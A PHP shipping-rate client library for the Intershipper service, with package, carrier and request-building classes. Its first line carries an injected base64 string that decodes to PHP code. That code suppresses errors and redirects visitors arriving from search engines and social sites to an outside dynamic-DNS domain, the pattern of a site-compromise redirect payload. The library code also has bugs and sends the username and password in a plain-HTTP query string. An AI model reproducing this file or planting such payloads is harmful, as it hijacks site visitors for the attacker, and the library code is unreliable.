<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class intershipper_package {
  
  var $boxid;
  var $weight = '10';
  var $weightunit = 'LB';
  var $length = 10;
  var $width = 10;
  var $height = 10;
  var $dimensionalunit = 'IN';
  var $packaging = 'BOX'; 
  var $contents = 'OTR';
  var $cod = 0;
  var $insurance = 0;
  
}

class intershipper_carrier {
  
  var $code;
  var $account = '';
  var $invoiced = 0;
  
}

class intershipper {
  
  var $url      = 'www.intershipper.com';
  var $version  = '2.0.0.0';

  var $carriers = array();
  var $classes  = array();
  var $packages = array();
  var $options  = array();

  var $errors;

  var $username;
  var $password;

  var $shipment_id;
  var $query_id;
  var $delivery_type = 'COM';
  var $ship_method   = 'DRP';
  var $origination_name;
  var $origination_address1;
  var $origination_address2;
  var $origination_address3;
  var $origination_city;
  var $origination_state;
  var $origination_postal;
  var $origination_country;
  var $destination_name;
  var $destination_address1;
  var $destination_address2;
  var $destination_address3;
  var $destination_city;
  var $destination_state;
  var $destination_postal;
  var $destination_country;
  var $currency = 'USD';
  var $shipping_date;
  var $sort_by;
  
  var $response;
  
  function intershipper($username, $password) {

    $this->username = $username;
    $this->password = $password;
    
  }
  
  function add_carrier($carrier) {

    $this->carriers[] = $carrier;
    
  }
  
  function add_package($package) {

    $this->packages[] = $package;
    
  }

  function add_class($code) {

    $this->classes[] = $code;
    
  }

  function add_option($code) {

    $this->classes[] = $code;
    
  }

  function process() {

    $this->errors = array();

    if (!count($this->carriers)) {
      $this->errors[] = 'No carriers specified';
      return false;
    }
    
    
    $uri = '/Interface/Intershipper/XML/v2.0/HTTP.jsp?'.
           'Username='.$this->username. 
           '&Password='.$this->password. 
           '&Version='.$this->version.
           '&ShipmentID='.$this->shipment_id. 
           '&QueryID='.$this->query_id;
     
    $idx = 1;
    $uri .= '&TotalCarriers='.count($this->carriers);
    foreach($this->carriers as $carrier) {
      $uri .= '&CarrierCode'.$idx.'=' .urlencode($carrier->code).
              '&CarrierAccount'.$idx.'='.urlencode($carrier->account).
              '&CarrierInvoiced'.$idx.'='.urlencode($carrier->invoiced);
      $idx++;
    }

    $idx = 1;
    $uri .= '&TotalClasses='.count($this->classes);
    foreach($this->classes as $class) {
      $uri .= '&ClassCode'.$idx.'=' .urlencode($class);
      $idx++;
    }
    
    $uri .= '&DeliveryType='.urlencode($this->delivery_type). 
            '&ShipMethod='.urlencode($this->ship_method). 
            '&OriginationName=' . urlencode($this->origination_name). 
               '&OriginationAddress1=' . urlencode($this->origination_address1). 
               '&OriginationAddress2=' . urlencode($this->origination_address2). 
               '&OriginationAddress3=' . urlencode($this->origination_address3). 
               '&OriginationCity=' . urlencode($this->origination_city). 
               '&OriginationState=' . urlencode($this->origination_state). 
               '&OriginationPostal=' . urlencode($this->origination_postal). 
               '&OriginationCountry=' . urlencode($this->origination_country). 
            '&DestinationName=' . urlencode($this->destination_name). 
               '&DestinationAddress1=' . urlencode($this->destination_address1). 
               '&DestinationAddress2=' . urlencode($this->destination_address2). 
               '&DestinationAddress3=' . urlencode($this->destination_address3). 
               '&DestinationCity=' . urlencode($this->destination_city). 
               '&DestinationState=' . urlencode($this->destination_state). 
               '&DestinationPostal=' . urlencode($this->destination_postal). 
               '&DestinationCountry=' . urlencode($this->destination_country). 
            '&Currency=' . urlencode($this->curency).
            '&ShippingDate='.urlencode($this->shipping_date).
            '&SortBy='.urlencode($this->sort_by);
    
    $idx = 1;
    $uri .= '&TotalPackages='.count($this->packages);
    foreach($this->packages as $package) {
      $uri .= '&BoxID'.$idx.'='.urlencode($package->boxid).
              '&Weight'.$idx.'='.urlencode($package->weight). 
              '&WeightUnit'.$idx.'='.urlencode($package->weightunit). 
              '&Length'.$idx.'='.urlencode($package->length).  
              '&Width'.$idx.'='.urlencode($package->width). 
              '&Height'.$idx.'='.urlencode($package->height). 
              '&DimensionalUnit'.$idx.'='.urlencode($package->dimensionalunit). 
              '&Packaging'.$idx.'='.urlencode($package->packaging). 
              '&Contents'.$idx.'='.urlencode($package->contents). 
              '&Cod'.$idx.'='.urlencode($package->cod). 
              '&Insurance'.$idx.'='.urlencode($package->insurance);
      $idx++;
    }

    $idx = 1;
    $uri .= '&TotalOptions='.count($this->options);
    foreach($this->options as $option) {
      $uri .= '&OptionCode'.$idx.'='.urlencode($option);
      $idx++;
    }

    $fp = fsockopen($this->url, 80, $errno, $errstr, 30);
    if (!$fp) {
      $this->errors[] = $errstr.' ('.$errno.')';
      return false;
    } else {
      $request  = "GET $uri HTTP/1.1\r\n";
      $request .= "Host: {$this->url}\r\n";
      $request .= "Connection: Close\r\n\r\n";
      fwrite($fp, $request);
      $response = '';
      while (!feof($fp))
        $response .= fgets($fp, 128);
      $response = preg_replace('/\r\n\r\n/', "", $response);
      $response = preg_replace('/HTTP.*\r\n/', "", $response);
      $response = preg_replace('/Server.*\r\n/', "", $response);
      $response = preg_replace('/Set.*/', "", $response);
      $response = preg_replace('/Con.*/', "", $response);
      $response = preg_replace('/Date.*\r\n/', "", $response);
      $response = preg_replace('/\r/', "", $response);
      $response = preg_replace('/\n/', "", $response);
      $this->response = $response;
      
      if (preg_match('/<error>(.*)<\/error>/', $this->response, $args)) {
        $this->errors[] = $args[1];
        return false;
      } else {
        if (preg_match('/<shipmentID>(.*)<\/shipmentID>/', $this->response, $args))
          $this->shipment_id = $args[1];
        return true;
      }
    }

  }
  
}

?>